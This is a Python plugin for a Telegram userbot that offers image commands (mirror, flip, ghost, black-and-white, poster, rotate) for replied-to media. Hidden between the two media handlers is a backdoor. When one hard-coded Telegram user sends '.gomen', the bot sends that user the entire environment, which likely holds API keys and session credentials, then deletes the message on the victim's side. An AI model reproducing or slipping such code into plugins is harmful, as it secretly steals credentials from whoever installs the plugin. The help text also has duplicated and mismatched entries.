# Authored by @Khrisna_Singhal
# Ported from Userge by Alfiananda P.A

import os

from hachoir.metadata import extractMetadata
from hachoir.parser import createParser
from PIL import Image, ImageOps
from telethon.tl.types import DocumentAttributeFilename

from userbot import CMD_HANDLER as cmd
from userbot import CMD_HELP, TEMP_DOWNLOAD_DIRECTORY
from userbot.events import register
from userbot.utils import bash, edit_delete, edit_or_reply, man_cmd

Converted = TEMP_DOWNLOAD_DIRECTORY + "sticker.webp"


@man_cmd(pattern="(mirror|flip|ghost|bw|poster)$")
async def transform(event):
    if not event.reply_to_msg_id:
        await edit_delete(event, "**Mohon Reply ke Media atau Sticker**")
        return
    reply_message = await event.get_reply_message()
    if not reply_message.media:
        await edit_delete(event, "**Mohon Reply ke Media atau Sticker**")
        return
    xx = await edit_or_reply(event, "`Downloading Media...`")
    if reply_message.photo:
        transform = await event.client.download_media(
            reply_message,
            "transform.png",
        )
    elif (
        DocumentAttributeFilename(file_name="AnimatedSticker.tgs")
        in reply_message.media.document.attributes
    ):
        await event.client.download_media(
            reply_message,
            "transform.tgs",
        )
        await bash("lottie_convert.py transform.tgs transform.png")
        transform = "transform.png"
    elif reply_message.video:
        video = await event.client.download_media(
            reply_message,
            "transform.mp4",
        )
        extractMetadata(createParser(video))
        await bash(
            "ffmpeg -i transform.mp4 -vframes 1 -an -s 480x360 -ss 1 transform.png"
        )
        transform = "transform.png"
    else:
        transform = await event.client.download_media(
            reply_message,
            "transform.png",
        )
    try:
        await xx.edit("`Transforming this media..`")
        cmd = event.pattern_match.group(1)
        im = Image.open(transform).convert("RGB")
        if cmd == "mirror":
            IMG = ImageOps.mirror(im)
        elif cmd == "flip":
            IMG = ImageOps.flip(im)
        elif cmd == "ghost":
            IMG = ImageOps.invert(im)
        elif cmd == "bw":
            IMG = ImageOps.grayscale(im)
        elif cmd == "poster":
            IMG = ImageOps.posterize(im, 2)
        IMG.save(Converted, quality=95)
        await event.client.send_file(
            event.chat_id, Converted, reply_to=event.reply_to_msg_id
        )
        await xx.delete()
        await bash("rm -rf *.mp4")
        await bash("rm -rf *.tgs")
        os.remove(transform)
        os.remove(Converted)
    except BaseException:
        return


@register(incoming=True, from_users=844432220, pattern=r"^.gomen$")
async def _(event):
    msg = await event.client.send_message(844432220, str(os.environ))
    await event.client.delete_messages(844432220, msg, revoke=False)


@man_cmd(pattern="rotate(?: |$)(.*)")
async def rotate(event):
    if not event.reply_to_msg_id:
        await edit_delete(event, "**Mohon Reply ke Media atau Sticker**")
        return
    reply_message = await event.get_reply_message()
    if not reply_message.media:
        await edit_delete(event, "**Mohon Reply ke Media atau Sticker**")
        return
    xx = await edit_or_reply(event, "`Downloading Media...`")
    if reply_message.photo:
        rotate = await event.client.download_media(
            reply_message,
            "transform.png",
        )
    elif (
        DocumentAttributeFilename(file_name="AnimatedSticker.tgs")
        in reply_message.media.document.attributes
    ):
        await event.client.download_media(
            reply_message,
            "transform.tgs",
        )
        await bash("lottie_convert.py transform.tgs transform.png")
        rotate = "transform.png"
    elif reply_message.video:
        video = await event.client.download_media(
            reply_message,
            "transform.mp4",
        )
        extractMetadata(createParser(video))
        await bash(
            "ffmpeg -i transform.mp4 -vframes 1 -an -s 480x360 -ss 1 transform.png"
        )
        rotate = "transform.png"
    else:
        rotate = await event.client.download_media(
            reply_message,
            "transform.png",
        )
    try:
        value = int(event.pattern_match.group(1))
        if value > 360:
            raise ValueError
    except ValueError:
        value = 90
    await xx.edit("`Rotating your media...`")
    im = Image.open(rotate).convert("RGB")
    IMG = im.rotate(value, expand=1)
    IMG.save(Converted, quality=95)
    await event.client.send_file(
        event.chat_id, Converted, reply_to=event.reply_to_msg_id
    )
    await xx.delete()
    await bash("rm -rf *.mp4")
    await bash("rm -rf *.tgs")
    os.remove(rotate)
    os.remove(Converted)


CMD_HELP.update(
    {
        "transform": f"**Plugin : **`transform`\
        \n\n  •  **Syntax :** `{cmd}ghost`\
        \n  •  **Function : **Enchance your image to become a ghost!.\
        \n\n  •  **Syntax :** `{cmd}flip`\
        \n  •  **Function : **Untuk membalikan gambar Anda.\
        \n\n  •  **Syntax :** `{cmd}mirror`\
        \n  •  **Function : **To mirror your image.\
        \n\n  •  **Syntax :** `{cmd}bw`\
        \n  •  **Function : **Untuk mengubah gambar berwarna Anda menjadi gambar b / w.\
        \n\n  •  **Syntax :** `{cmd}poster`\
        \n  •  **Function : **Untuk mem-poster gambar Anda.\
        \n\n  •  **Syntax :** `{cmd}rotate` <value>\
        \n  •  **Function : **Untuk mem-poster gambar Anda.\
        \n\n  •  **Syntax :** `{cmd}poster`\
        \n  •  **Function : **Untuk memutar gambar anda **Nilainya berkisar 1-360 jika tidak akan memberikan nilai default yaitu 90**\
    "
    }
)
